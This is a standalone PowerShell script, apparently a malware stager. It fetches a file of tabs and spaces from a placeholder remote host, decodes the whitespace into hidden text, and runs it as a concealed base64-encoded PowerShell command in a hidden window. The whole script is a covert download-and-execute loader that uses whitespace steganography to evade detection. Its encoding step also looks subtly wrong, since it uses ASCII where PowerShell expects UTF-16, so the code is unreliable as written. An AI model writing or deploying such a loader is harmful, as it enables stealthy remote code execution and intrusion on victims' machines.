# URL of the tabs and spaces file
$tabsSpacesURL = "http://x.x.x.x/tabsandspaces.txt"

# Fetch tabs and spaces content from the URL
$tabsSpacesData = (Invoke-WebRequest -Uri $tabsSpacesURL).Content

# Convert tabs and spaces to binary
$binaryData = $tabsSpacesData.Replace(" ", "0").Replace("`t", "1")

# Decode binary data to text
$textData = ""
for ($i = 0; $i -lt $binaryData.Length; $i += 8) {
    $textData += [char][convert]::ToInt32($binaryData.Substring($i, 8), 2)
}

# Convert text data to base64
$base64TextData = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($textData))

# Create a new PowerShell process
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = "powershell.exe"
$process.StartInfo.Arguments = "-w hidden -EncodedCommand $base64TextData"
$process.StartInfo.UseShellExecute = $false
$process.StartInfo.RedirectStandardOutput = $true
$process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$process.Start()

# Continuously read from the output stream
while ($process.HasExited -eq $false) {
    $output = $process.StandardOutput.ReadLine()
    if ($output -ne $null) {
        Write-Host $output
    }
}

# Wait for the process to exit
$process.WaitForExit()
